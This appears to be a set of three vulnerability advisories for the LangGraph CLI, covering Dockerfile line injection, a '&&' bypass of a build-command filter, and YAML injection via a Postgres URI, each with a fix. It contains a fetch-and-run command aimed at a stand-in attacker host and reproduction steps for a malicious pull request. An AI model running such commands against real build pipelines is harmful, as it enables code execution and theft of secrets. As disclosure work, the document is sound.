Summary
The dockerfile_lines field in langgraph.json is a documented configuration option that allows users to inject arbitrary lines into the generated Dockerfile immediately after the FROM directive. These lines are read from the JSON config, passed through validate_config() without any content validation, and then directly embedded into the Dockerfile string via os.linesep.join(config["dockerfile_lines"]). No restriction is placed on what Dockerfile instructions can be used — including RUN, COPY, ADD, ENV, or any other directive. When a developer or CI/CD pipeline executes langgraph build, Docker evaluates these injected directives and executes the embedded shell commands with full access to the Docker build environment, the host's Docker socket, and any build-time secrets.
Data Flow (Source → Sink)
Source: langgraph.json → config["dockerfile_lines"] (array of strings, no validation)

Flow: validate_config() at config.py:182 passes dockerfile_lines through unmodified → config_to_docker() / node_config_to_docker() at config.py:1100,1219 calls os.linesep.join(config["dockerfile_lines"]) and embeds result directly in Dockerfile content → _build() at cli.py:338 passes the Dockerfile via stdin to docker build -f -

Sink: Docker daemon evaluates the injected Dockerfile directives and executes any RUN commands inside the build container

Steps to Reproduce
  1. Create or fork a LangGraph project repository and open a pull request that modifies langgraph.json to add a dockerfile_lines entry containing a malicious RUN directive.
  2. Wait for a developer or CI system to run langgraph build -t test-image -c langgraph.json to evaluate the PR.
  3. The dockerfile_lines content is directly embedded in the generated Dockerfile and executed by the Docker daemon during the build.
  4. Observe the payload executing in the build environment — exfiltrating secrets, installing backdoors, or modifying build artifacts.

Impact

An attacker who can modify langgraph.json (e.g., via a malicious pull request, a supply chain compromise of a shared config template, or a compromised developer machine) can achieve arbitrary code execution in the Docker build environment. This includes: exfiltrating Docker registry credentials, cloud provider credentials, or build secrets; poisoning the resulting Docker image with a persistent backdoor that ships to production; and pivoting from the build environment to the broader CI/CD infrastructure via the Docker socket or mounted secrets.

Mitigation

The most secure fix is to validate each entry in dockerfile_lines against an allowlist of safe Dockerfile directives (e.g., only ENV, ARG, LABEL) and reject RUN, COPY, ADD. Alternatively, add a security warning in documentation and CI template guidance that treating dockerfile_lines as a trusted-source-only field. At minimum, validate that no entry starts with RUN.

# In validate_config() — add validation for dockerfile_lines:
DISALLOWED_DOCKERFILE_PREFIXES = {"RUN", "ADD", "COPY", "ENTRYPOINT", "CMD", "SHELL"}

for line in config.get("dockerfile_lines", []):
    stripped = line.strip().upper()
    for prefix in DISALLOWED_DOCKERFILE_PREFIXES:
        if stripped.startswith(prefix + " ") or stripped == prefix:
            raise click.UsageError(
                f"dockerfile_lines entry '{line[:50]}' uses disallowed "
                f"directive '{prefix}'. Only ENV, ARG, LABEL are permitted."
            )

Summary
Commit e00a027 introduced has_disallowed_build_command_content() to block shell metacharacters (", backtick, \, newline, |, ;, $, >, <) in the --build-command and --install-command CLI flags. However, the fix intentionally permits && (double-ampersand) to support legitimate command chaining in build scripts. This creates a bypass: an attacker who controls the value passed to these flags can append arbitrary shell commands using && without triggering any blocked character. Commands like npm install && wget http://attacker.com/payload -O /tmp/p && sh /tmp/p pass all validation checks. The command is then embedded into a Dockerfile RUN directive and executed during docker build.
Data Flow (Source → Sink)
Source: CLI flags --build-command / --install-command (attacker-controlled string)

Flow: cli.py:412–423 calls has_disallowed_build_command_content() — passes because && is not blocked → _build() at cli.py:338–346 passes value to node_config_to_docker() as install_command/build_command → config.py:1205 embeds directly: f"RUN cd {container_root} && {install_cmd}" → Docker daemon executes the full RUN command including the attacker-appended chain

Sink: Shell command execution inside Docker build container
Vulnerable Code
libs/cli/langgraph_cli/config.py Lines 16–43 
DISALLOWED_BUILD_COMMAND_CHARS = [
    '"', '`', '\\', '\n', '\r', '\0', '\t',
    '|', ';', '$', '>', '<',
    # NOTE: '&&' is NOT in this list — intentionally permitted
]

# Allows: cmd1 && cmd2 && cmd3 (chaining without restriction)
# Blocks only: cmd & background_exec
_SINGLE_AMPERSAND_RE = re.compile(r'(?<!&)&(?:&&)*(?!&)')

def has_disallowed_build_command_content(command: str) -> bool:
    if any(char in command for char in DISALLOWED_BUILD_COMMAND_CHARS):
        return True
    if _SINGLE_AMPERSAND_RE.search(command):
        return True
    return False  # &&-chained payloads PASS this check

Impact

Any CI/CD pipeline, build script, or deployment automation that reads --build-command or --install-command from user input, environment variables, or external configuration without independently validating the value is vulnerable to arbitrary command execution in the Docker build environment. An attacker who can influence these flag values can execute commands in the build container, exfiltrate build secrets, poison the resulting image, or move laterally via the Docker socket.

Mitigation

Do not execute build/install commands via shell string interpolation in a Dockerfile RUN directive. Instead, pass the command as a JSON exec array to avoid shell interpretation entirely. If shell expansion must be supported, use a strict allowlist of safe characters (alphanumerics, hyphen, dot, slash, space, =, @) and block all others including &&. Alternatively, constrain the commands to a known set of package-manager commands (e.g., only npm install, npm ci, yarn install, pnpm install).

# Option A: Allowlist approach (stricter)
ALLOWED_BUILD_COMMAND_CHARS = re.compile(r'^[a-zA-Z0-9 \-_./=@:]+$')

def has_disallowed_build_command_content(command: str) -> bool:
    return not ALLOWED_BUILD_COMMAND_CHARS.match(command)

# Option B: JSON exec form in Dockerfile (avoids shell entirely)
# Instead of: f"RUN cd {path} && {install_cmd}"
# Use:        f"RUN [\"sh\", \"-c\", \"cd {path} && {install_cmd}\"]"  -- still vulnerable
# Better:     Write a wrapper script and COPY it in, then RUN the script

Summary
The --postgres-uri CLI option value is passed directly to compose_as_dict() and embedded as a plain scalar in the Docker Compose YAML via dict_to_yaml(). The custom dict_to_yaml() function does not quote string values, so a URI containing YAML-significant characters (e.g., : followed by a space, # preceded by whitespace, or an embedded newline) can break YAML structure. Since YAML comments begin with # preceded by whitespace, a URI like postgres://host/db # comment\nnewkey: value would corrupt the compose file and potentially inject additional YAML keys. No validation is performed on the URI format.

Source: CLI flag --postgres-uri (no validation, any string accepted)

Proof of Concept
YAML Injection via newline in postgres_uri

Impact

An attacker who can influence the --postgres-uri argument (e.g., in a deployment script that reads it from user input or an untrusted configuration source) can inject arbitrary environment variables into the langgraph-api container. This could be used to override security-sensitive environment variables (LANGSMITH_API_KEY, LANGGRAPH_CLOUD_LICENSE_KEY) or inject variables that control application behavior. Without newline injection, the risk is limited to YAML corruption causing startup failures.

Mitigation

Quote all string values in the dict_to_yaml() function, or use a proper YAML serialization library (e.g., PyYAML with yaml.dump()) instead of the hand-rolled serializer. At minimum, validate that postgres_uri matches the expected URI scheme format before accepting it.
